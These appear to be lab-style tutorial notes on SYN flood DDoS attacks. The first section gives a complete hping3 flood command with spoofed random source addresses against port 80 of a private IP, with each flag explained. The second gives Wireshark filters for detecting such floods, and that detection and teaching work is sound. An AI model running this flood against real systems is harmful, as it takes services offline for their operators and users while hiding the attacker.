# Conducting & Detecting DDoS (SYN flood) Attacks
## Conducting DDoS Attacks

Load up kali linux:
Install hping3
	$ sudo apt-get install hping3

Direct the SYN flood attack
	$ hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.159
		-c 15000: number of packets we're sending is 15,000
		-d 120: size of the packets is 120 bytes
		-S: SYN flag enabled
		-w 64: TCP Window size is 64
		-p 80: victim's HTTP webserver port
		--flood: send packets as fast as possible
		--rand-source: generates spoofed IP addresses & stops the victim's SYN-ACK reply packets from reaching us

## Detecting SYN Flood Attacks

Load up wireshark:
	An attack will show a large amount of TCP traffic with little variance in time
Filter SYN packets without acknowledgement with:
	tcp.flags.syn == 1 and tcp.flags.ack == 0
Notice: the attacking IP addresses all target the same port (80)
Filter: tcp.flags.syn == 1 and tcp.flags.ack == 1:
	compare this normal traffic with that of the suspected attack traffic to determine volume of normal requests
Can view Wireshark's graph feature to look for abnormalcies 
